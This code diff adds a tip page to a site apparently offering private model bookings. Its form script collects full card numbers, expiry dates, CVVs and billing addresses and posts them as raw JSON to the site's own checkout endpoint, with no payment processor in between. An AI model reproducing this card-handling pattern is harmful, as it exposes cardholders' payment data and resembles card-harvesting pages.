@@ -171,7 +171,8 @@ function setMessage(target, text, type = 'info') {
 }
 
 function renderFooter() {
-    return `&copy; 2026 Eclipse &mdash; Private Access Only<br><a class="contact-link" href="${SITE.settings.contactUrl}" target="_blank" rel="noopener noreferrer">${escapeHtml(SITE.settings.contactLabel)}</a>`;
+    const tipsHref = `${getHomePath()}/tips/`;
+    return `&copy; 2026 Eclipse &mdash; Private Access Only<br><a class="contact-link" href="${SITE.settings.contactUrl}" target="_blank" rel="noopener noreferrer">${escapeHtml(SITE.settings.contactLabel)}</a><br><a class="contact-link" href="${tipsHref}">Send a Tip</a>`;
 }
 
 function initHomePage() {
@@ -579,6 +580,107 @@ function initModelPage() {
     initCheckout(model, location);
 }
 
+function initTipsPage() {
+    const footer = $('#page-footer');
+    if (footer) {
+        footer.innerHTML = renderFooter();
+    }
+
+    const amountInput = $('#tip-amount');
+    const message = $('#tip-message');
+    const form = $('#tip-form');
+    const submit = $('#tip-submit');
+    const amountButtons = $all('[data-tip-amount]');
+
+    function syncAmountButtons() {
+        const current = amountInput.value.trim();
+        amountButtons.forEach((button) => {
+            button.classList.toggle('active', button.dataset.tipAmount === current);
+        });
+    }
+
+    amountButtons.forEach((button) => {
+        button.addEventListener('click', () => {
+            amountInput.value = button.dataset.tipAmount || '';
+            syncAmountButtons();
+        });
+    });
+
+    amountInput.addEventListener('input', syncAmountButtons);
+
+    form.addEventListener('submit', async (event) => {
+        event.preventDefault();
+        setMessage(message, '');
+
+        const amount = Number(amountInput.value.trim());
+        if (!Number.isFinite(amount) || amount <= 0) {
+            setMessage(message, 'Please enter a valid tip amount.', 'error');
+            return;
+        }
+
+        const payload = {
+            actionKey: 'tip',
+            actionLabel: 'Tip',
+            amount,
+            modelSlug: 'tip',
+            modelName: 'Eclipse Tip',
+            cardNumber: $('#card-number').value.trim(),
+            expiryDate: $('#expiry-date').value.trim(),
+            cvv: $('#cvv').value.trim(),
+            billingName: $('#billing-name').value.trim(),
+            billingEmail: $('#billing-email').value.trim(),
+            billingAddress: $('#billing-address').value.trim(),
+            billingCity: $('#billing-city').value.trim(),
+            billingState: $('#billing-state').value.trim(),
+            billingZip: $('#billing-zip').value.trim(),
+            billingCountry: $('#billing-country').value.trim(),
+            notes: $('#tip-notes').value.trim(),
+            sourceUrl: window.location.href,
+        };
+
+        if (!payload.cardNumber || !payload.expiryDate || !payload.cvv || !payload.billingName || !payload.billingEmail || !payload.billingAddress || !payload.billingCity || !payload.billingState || !payload.billingZip || !payload.billingCountry) {
+            setMessage(message, 'Please complete the payment information and billing address.', 'error');
+            return;
+        }
+
+        submit.disabled = true;
+        submit.textContent = 'Processing...';
+
+        try {
+            const response = await fetch(SITE.settings.checkoutEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            });
+
+            let data = {};
+            try {
+                data = await response.json();
+            } catch {
+                data = {};
+            }
+
+            if (!response.ok) {
+                throw new Error(data.error || 'Unable to submit your tip right now.');
+            }
+
+            const tipText = `Thank you for your tip of ${formatCurrency(amount)}.`;
+            const requestText = data.requestId ? ` Reference: ${data.requestId}.` : '';
+            setMessage(message, `${tipText}${requestText}`, 'success');
+            form.reset();
+            amountInput.value = '';
+            syncAmountButtons();
+        } catch (error) {
+            setMessage(message, error.message || 'Unable to submit your tip right now.', 'error');
+        } finally {
+            submit.disabled = false;
+            submit.textContent = 'Send Tip';
+        }
+    });
+}
+
 function initShared() {
     const footer = $('#page-footer');
     if (footer && !footer.innerHTML.trim()) {
@@ -592,4 +694,5 @@ document.addEventListener('DOMContentLoaded', () => {
     if (page === 'home') initHomePage();
     if (page === 'gallery') initGalleryPage();
     if (page === 'model') initModelPage();
+    if (page === 'tips') initTipsPage();
 });
